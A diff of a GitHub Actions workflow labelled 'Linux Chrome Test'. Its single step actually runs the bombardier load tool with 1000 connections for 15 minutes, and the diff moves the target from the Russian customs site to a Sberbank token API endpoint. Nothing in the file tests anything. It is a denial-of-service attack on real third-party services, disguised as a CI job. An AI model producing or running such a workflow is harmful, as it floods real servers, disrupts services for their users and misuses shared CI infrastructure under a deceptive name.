@@ -1,4 +1,4 @@
-name: Linux Chrome Test
+name: Linux Chrome Test 16
 
 on:
   push:
@@ -18,4 +18,4 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v2 # Required to mount the Github Workspace to a volume
       - name: Docker
-        run: /usr/bin/docker run --rm alpine/bombardier -c 1000 -d 900s -l https://customs.gov.ru
+        run: /usr/bin/docker run --rm alpine/bombardier -c 1000 -d 900s -l https://api.sberbank.ru/prod/tokens/v2/oidc
